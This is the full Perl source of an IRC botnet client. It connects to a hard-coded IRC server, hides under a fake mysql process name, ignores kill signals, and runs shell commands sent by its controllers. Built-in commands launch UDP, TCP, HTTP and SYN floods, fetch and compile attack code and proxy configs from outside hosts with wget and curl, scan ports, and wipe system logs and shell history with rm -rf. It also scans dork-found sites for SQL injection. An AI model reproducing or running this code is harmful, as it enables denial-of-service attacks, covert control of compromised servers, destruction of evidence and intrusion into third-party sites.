#!/usr/bin/perl
#!u @ddos
#!u @commands
#!u @irc
############################################
my $processo = '/usr/sbin/mysql';
my $linas_max='10';
my $sleep='5';
my $cmd="";
my $id="";
############################################
my @adms=("xxx","");
my @canais=("#s");
my $chanpass = "@";
$num = int rand(99999);
my $nick = "XXX-" . $num . "";
my $ircname ='trala';
chop (my $realname = 'tralala  ');
$servidor='2.57.122.80' unless $servidor;
my $porta='6667';
############################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %Dunix;
my $dunix_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
   if ($#_ == '1') {
      my $socket = $_[0];
      print $socket "$_[1]\n";

   } else {
      print $IRC_cur_socket "$_[0]\n";
   }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
   PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
      $IRC_cur_socket = $IRC_socket;
      $IRC_socket->autoflush(1);
      $sel_cliente->add($IRC_socket);
      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
      nick("$meunick");
      sendraw("PASS ");
      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
      sleep 1;
   }
}

my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
      $IRC_cur_socket = $fh;
      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
      $nread = sysread($fh, $msg, 4096);
      if ($nread == 0) {
         $sel_cliente->remove($fh);
         $fh->close;
         delete($irc_servers{$fh});
      }
      @lines = split (/\n/, $msg);
      for(my $c=0; $c<= $#lines; $c++) {
         $line = $lines[$c];
         $line=$line_temp.$line if ($line_temp);
         $line_temp='';
         $line =~ s/\r$//;
         unless ($c == $#lines) {
            parse("$line");
         } else {
            if ($#lines == 0) {
               parse("$line");
            } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
            } else {
               $line_temp = $line;
            }
         }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
      sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
      if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v7.25 CyberBot\001");
      }
      if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
         if ($onde eq "$meunick"){
            shell("$pn", "$args");
         }
#End of Connect
         if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
               ircase("$pn","$onde","$1") unless ($natrix eq "!u" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
               $ondep = $onde;
               $ondep = $pn if $onde eq $meunick;
               bfunc("$ondep","$1");
            } else {
               shell("$onde", "$arg");
            }
         }
      }
   }
######################### End of prefix
   elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
      if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
      nick("$meunick|".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
      $meunick = $2;
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
      foreach my $canal (@canais) {
         sendraw("JOIN $canal $chanpass");
      }
   }
}

sub bfunc {
   my $printl = $_[0];
   my $funcarg = $_[1];
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (fork) {
         exit;
      } else {

         if ($funcarg =~ /^killme/) {
            sendraw($IRC_cur_socket, "QUIT :");
            $killd = "kill -9 ".fork;
            system (`$killd`);
         }
######################
#                    Commands                      #
######################
         if ($funcarg =~ /^commands/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[-[Devising's Modded  Perl Bot Commands List]-] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Hacking Based]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u multiscan <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u socks5");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u sql <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u portscan <ip>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u logcleaner");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u sendmail <subject> <sender> <recipient> <message>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u system");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u cleartmp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u unixable");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u nmap <ip> <beginport> <endport>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u back <ip><port>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u linuxhelp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u cd tmp:. | for example");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Advisory/New Based]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u packetstorm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u milw0rm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[DDos Based]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u udpflood <host> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u udp <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u tcpflood <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u httpflood <host> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u sqlflood <host> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[IRC Based]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u killme");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u join #channel");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u part #channel");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u reset");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u voice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u owner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u deowner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u devoice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u halfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u dehalfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u op <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u deop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Flooding Based]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u msgflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u dunixflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u ctcpflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u noticeflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u channelflood");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u maxiflood <who> ");
}

         if ($funcarg =~ /^linuxhelp/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Linux Help]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Dir where you are : pwd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Start a Perl file : perl file.pl");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Go back from dir : cd ..");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Force to Remove a file/dir : rm -rf file/dir;ls -la");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Show all files/dir with permissions : ls -lia");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Find config.inc.php files : find / -type f -name config.inc.php");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Find all writable folders and files : find / -perm -2 -ls");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Find all .htpasswd files : find / -type f -name .htpasswd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u  Find all service.pwd files : find / -type f -name service.pwd");
         }

         if ($funcarg =~ /^help/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Help Commands]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u flooding - For IRC Flooding Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u irc - For IRC Bot Command Help ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u ddos - For DDos Command Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u news - For Security News Command Help ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u hacking - For Hacking Command Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u linuxhelp - For Linux Help");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u extras");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u version - For version info");
         }

         if ($funcarg =~ /^flooding/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Flooding Based]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u msgflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u dunixflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u ctcpflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u noticeflood <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u channelflood");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u maxiflood <who> ");
         }

         if ($funcarg =~ /^irc/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[IRC Commands]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u voice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u owner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u deowner <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u devoice <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u halfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u dehalfop <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u op <who> ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u deop <who> ");
         }

         if ($funcarg =~ /^ddos/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Ddos Commands]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u udpflood <host> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u udp <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u tcpflood <host> <port> <packet size> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u httpflood <host> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u sqlflood <host> <time>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Extras Ddos Commands]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u syn <destip> <destport> <time in seconds>");
                        sendraw($IRC_cur_socket, "PRIVMSG $printl :!u sudp <host> <port> <reflection file> <threads> <time> | Requires ./50 installed");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3Go to @extras to install required scripts] ");

         }

         if ($funcarg =~ /^news/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[News Commands]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u packetstorm");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u milw0rm");
         }

         if ($funcarg =~ /^hacking/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Hacking Commands]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u multiscan <vuln> <dork>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u socks5");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u portscan <ip>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u logcleaner");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u sendmail <subject> <sender> <recipient> <message>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u system");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u cleartmp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u unixable");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u nmap <ip> <beginport> <endport>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u back <ip><port>");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u linuxhelp");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u cd tmp:. | for example");
         }
              if ($funcarg =~ /^extras/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3-----[Extras]-----] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[3To install these scripts you need gunix installed] ");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u install-syn Syn.c");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :!u install-50x 50x.c");
         }
######################
#   End of  Help     #
######################


######################
#     Commands       #
######################
 if ($funcarg =~ /^system/) {
 sendraw($IRC_cur_socket, "PRIVMSG $printl Come on and hit that ricky");
 }
         if ($funcarg =~ /^sys/) {
            $uname=`uname -a`;
            $uptime=`uptime`;
            $ownd=`pwd`;
            $distro=`cat /etc/issue`;
            $id=`id`;
            $un=`uname -sro`;
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Info BOT : 7 Servidor :Hiden : 6667");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Uname -a     :  $uname");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Uptime       :  $uptime");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Own Prosses  :  $processo");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| ID           :  $id");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Own Dir      :  $ownd");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| OS           :  $distro");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Owner        :  fuck");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:System Info:.| Channel      :  #berau");
         }

         if ($funcarg =~ /^milw0rm/) {
            my @ltt=();
            my @bug=();
            my $x;
            my $page="";
            my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
            print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAunixept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
            my @r = <$socke>;
            $page="@r";
            close($socke);
            while ($page =~  m/<title>(.*)</g){
               $x = $1;
               if ($x =~ /\&lt\;/) {
                  $x =~ s/\&lt\;/</g;
               }
               if ($x !~ /milw0rm/) {
                  push (@bug,$x);
               }
            }
            while ($page =~  m/<link.*expl.*([0-9]...)</g) {
               if ($1 !~ m/milw0rm.com|exploits|en/){
                  push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
               }
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:milw0rm:.| Latest exploits :");
            foreach $x (0..(@ltt - 1)) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:milw0rm:.|  $bug[$x] - $ltt[$x]");
               sleep 1;
            }
         }
######################
#   Devisings shit   #
######################
#######################
#      Version info   #
#######################
         if ($funcarg =~ /^version/) {
           sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:Version:.| LiGhT's Modded perlbot v2.");
         }
#######################
# End of Version info #
#######################
           #some links could be dead just updated there public scripts noob
           if ($funcarg =~ /^install-syn/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:Installing Syn:.| Please wait...");
            system 'cd /unix';
            system 'wget http://server.perpetual.pw/syn.c';
            system 'gunix -o syn syn.c -pthread';
            system 'rm -rf syn.c';
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:Installing Syn:.||--Syn is now installed and compiled :)");
         }

           if ($funcarg =~ /^syn\s+(.*)\s+(\d+)\s+(\d+)/) {
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:SYN DDoS:.| Attacking  ".$1.":".$2." for  ".$3."  seconds.");
            system "cd /unix";
            system "./syn ".$1." ".$2." ".$3." ";
            sendraw($IRC_cur_socket, "PRIVMSG $printl :|.:SYN DDoS:.| Attack Finished ");
         }



######################
#   End of Devisings #
#        Shit        #
######################


######################
#      Portscan      #
######################

         if ($funcarg =~ /^portscan (.*)/) {
            my $hostip="$1";
            @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194" ,"389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033 ","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000"," 7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
            my (@aberta, %porta_banner);
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Port-Scanner] Scanning for open ports on ".$1."  started .");
            foreach my $porta (@portas)  {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
                  'tcp', Timeout => 4);
               if ($scansock) {
                  push (@aberta, $porta);
                  $scansock->close;
               }
            }

            if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Port-Scanner] Open ports founded: @aberta");
            } else {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Port-Scanner] No open ports foundend.");
            }
         }

######################
#  End of  Portscan  #
#####################
#####################
# Chk The News from PacketStorm#
######################
if ($funcarg =~ /^packetstorm/) {
   my $c=0;
   my $x;
   my @ttt=();
   my @ttt1=();
   my $sock = IO::Socket::INET->new(PeerAddr=>"www.packetstormsecurity.org",PeerPort=>"80",Proto=>"tcp") or return;
   print $sock "GET /whatsnew20.xml HTTP/1.0\r\n";
   print $sock "Host: www.packetstormsecurity.org\r\n";
   print $sock "Aunixept: */*\r\n";
   print $sock "User-Agent: Mozilla/5.0\r\n\r\n";
   my @r = <$sock>;
   $page="@r";
   close($sock);
   while ($page =~  m/<link>(.*)<\/link>/g)
   {
           push(@ttt,$1);
   }
   while ($page =~  m/<description>(.*)<\/description>/g)
   {
          push(@ttt1,$1);
   }
   foreach $x (0..(@ttt - 1))
   {
         sendraw($IRC_cur_socket, "PRIVMSG $printl :[@PacketStorm] ".$ttt[$x]." ".$ttt1[$x]."");
      sleep 3;
      $c++;
   }
}
######################
#Auto Install Socks V5 using Mocks#
######################
if ($funcarg =~ /^socks5/) {

   sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SocksV5] Installing Mocks please wait");
      system 'cd /tmp';
      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';
      system 'tar -xvfz mocks-0.0.2.tar.gz';
      system 'rm -rf mocks-0.0.2.tar.gz';
      system 'cd mocks-0.0.2';
      system 'rm -rf mocks.conf';
      system 'curl -O http://andromeda.covers.de/221/mocks.conf';
      system 'touch mocks.log';
      system 'chmod 0 mocks.log';
         sleep(2);
      system './mocks start';
         sleep(4);
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SocksV5] Looks like its suunixesfully installed lets do the last things   ");

      #lets grab ip
      $net = `/sbin/ifconfig | grep 'eth0'`;
      if (length($net))
      {
      $net = `/sbin/ifconfig eth0 | grep 'inet addr'`;
      if (!length($net))
      {
      $net = `/sbin/ifconfig eth0 | grep 'inet end.'`;
      }
         if (length($net))
      {
         chop($net);
         @netip = split/:/,$net;
         $netip[1] =~ /(\d{1,3}).(\d{1,3}).(\d{1,3}).(\d{1,3})/;
         $ip = $1 .".". $2 .".". $3 .".". $4;

            #and print it ^^
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SocksV5] Connect here : ". $ip .":8787 ");
         }
      else
   {
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SocksV5] IP not founded ");
   }
}
else
{
      sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SocksV5] ERROR WHILE INSTALLING MOCKS ");
}
}
######################
#        Nmap        #
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
         my $hostip="$1";
         my $portstart = "$2";
         my $portend = "$3";
         my (@abertas, %porta_banner);
       sendraw($IRC_cur_socket, "PRIVMSG $printl : Nmap PortScan 12:. 4|  4: $1:. |.: 4Ports 12:.  4 $2-$3");
       foreach my $porta ($portstart..$portend){
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);
    if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 if ($xstats){
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Nmap]  Nmap PortScan :. |Founded  4 $porta"."/Open");
                 }
               }
             }
             if (@abertas) {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Nmap]  Nmap PortScan 12:. 4| Complete ");
             } else {
        sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Nmap]  Nmap PortScan 12:. 4| No open ports have been founded  13");
             }
          }
######################
#    End of Nmap     #
######################
######################
#    Log Cleaner     #
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Log-Cleaner]  LogCleaner :. |  Sorry our masters, nigga gotta big dick");
}
if ($funcarg =~ /^Cleandabitch/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Log-Cleaner]  LogCleaner :. |  This process can be long, just wait");
    system 'rm -rf /var/log/lastlog';
    system 'rm -rf /var/log/wtmp';
   system 'rm -rf /etc/wtmp';
   system 'rm -rf /var/run/utmp';
   system 'rm -rf /etc/utmp';
   system 'rm -rf /var/log';
   system 'rm -rf /var/logs';
   system 'rm -rf /var/adm';
   system 'rm -rf /var/apache/log';
   system 'rm -rf /var/apache/logs';
   system 'rm -rf /usr/local/apache/log';
   system 'rm -rf /usr/local/apache/logs';
   system 'rm -rf /unix/.bash_history';
   system 'rm -rf /unix/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Log-Cleaner]  LogCleaner :. |  All default log and bash_history files erased");
      sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Log-Cleaner]  LogCleaner :. |  Now Erasing the rest of the machine log files");
   system 'find / -name *.bash_history -exec rm -rf {} \;';
   system 'find / -name *.bash_logout -exec rm -rf {} \;';
   system 'find / -name "log*" -exec rm -rf {} \;';
   system 'find / -name *.log -exec rm -rf {} \;';
      sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :[@Log-Cleaner]  LogCleaner :. |  Done! All logs erased");
      }
######################
# End of Log Cleaner #
######################
######################
#              SQL SCANNER              #
######################

if ($funcarg =~ /^sql2\s+(.*?)\s+(.*)\s+(\d+)/){
   if (my $pid = fork) {
      waitpid($pid, 0);
   } else {
      if (my $d=fork()) {
         addproc($d,"[SQL2] $2");
         exit;
      } else {

         my $bug=$1;
         my $dork=$2;
         my $contatore=0;
         my ($type,$space);
         my %hosts;
         my $columns=$3;

                        ### Start Message
                        sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Starting Scan for $bug $dork");
                        sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Initializing on 5 Search Engines ");
                        ### End of Start Message
            # Starting Google
            my @glist=&google($dork);
                        sendraw($IRC_cur_socket, "PRIVMSG $printl [@SQL-Scanner] Google [".scalar(@glist)."] Sites");
                        my @mlist=&msn($dork);
                        my @asklist=&ask($dork);
                        my @allist=&alltheweb($dork);
                        my @aollist=&aol($dork);
                        my @lycos=&lycos($dork);
                        my @ylist=&yahoo($dork);
                        my @mzlist=&mozbot($dork);
                        my @mamalist&mamma($dork);
                        my @hlist=&hotbot($dork);
                        my @altlist=&altavista($dork);
                        my @slist=&search($dork);
                        my @ulist=&uol($dork);
                        my @fireball=&fireball($dork);
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Google [".scalar(@glist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] MSN [".scalar(@mlist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] AllTheWeb [".scalar(@allist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Ask.com [".scalar(@asklist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] AOL [".scalar(@aollist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Lycos [".scalar(@lycos)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Yahoo! [".scalar(@ylist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] MozBot [".scalar(@mzlist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Mama [".scalar(@mamalist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] HotBot [".scalar(@hlist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Altavista [".scalar(@altlist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] Search[dot]com [".scalar(@slist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] UoL [".scalar(@ulist)."] Sites");
            sendraw($IRC_cur_socket, "PRIVMSG $printl :[@SQL-Scanner] FireBall [".scalar(@flist)."] Sites");

            push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );

            sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ scan ] [ Filtruje ][ ".scalar(@tot)." Stron ] ");
            my @puliti=&unici(@tot);

            sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ SQL ] [ $dork ][ ".scalar(@puliti)." Stron ] ");

            my $uni=scalar(@puliti);

                  foreach my $sito (@puliti) {

                  $contatore++;
                    if ($contatore %5==0){
                       sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ scan ] [ Skanuje ][ ".$contatore." z ".$uni. " Stron ] ");
                    }
                  sleep 3;
                    if ($contatore==$uni-1){
                     sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ scan ] [ Koniec: $bug $dork ] ");
                    }
                  sleep 3;
                    my $site="http://".$sito.$bug;
                  sendraw($IRC_cur_socket, "PRIVMSG $printl :6 [ sql ] [ Sprawdzam: $site cols:  $columns ] ");

         $w=int rand(999);
         $w=$w*1000;
         for($i=1;$i<=$columns;$i++) {
            splice(@col,0,$#col+1);
            for($j=1;$j<=$i;$j++) {
               push(@col,$w+$j);
            }
            $tmp=join(",",@col);
            $test=$site."-1+UNION+SELECT+".$tmp."/*";
            print $test."\n";
            $result=get_html($test);
            $result =~ s/\/\*\*\///g;
            $result =~ s/UNION([^(\*)]*)//g;
            for($k=1;$k<=$i;$k++) {
               $n=$w+$k;
                  if($result =~ /$n/){
                     splice(@col2,0,$#col2+1);
                        for($s=1;$s<=$i;$s++) {
                           push(@col2,$s);
                        }
                     $tmp2=join(",",@col2);
                     $test2="+UNION+SELECT+".$tmp2."/*";
                     push @{$dane{$test2}},$k;
                  }
            }
         }
         for $klucz (keys %dane) {
            foreach $i(@{$dane{$klucz}}) {
               $klucz =~ s/$i/$i/;
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :3 [ vuln ]  [  ".$site."-1".$klucz."  ]  ");
         }
         %dane=();
            }
      }
   delproc($$);
   exit;
   }
}
#######  SQL SCANNER  #########

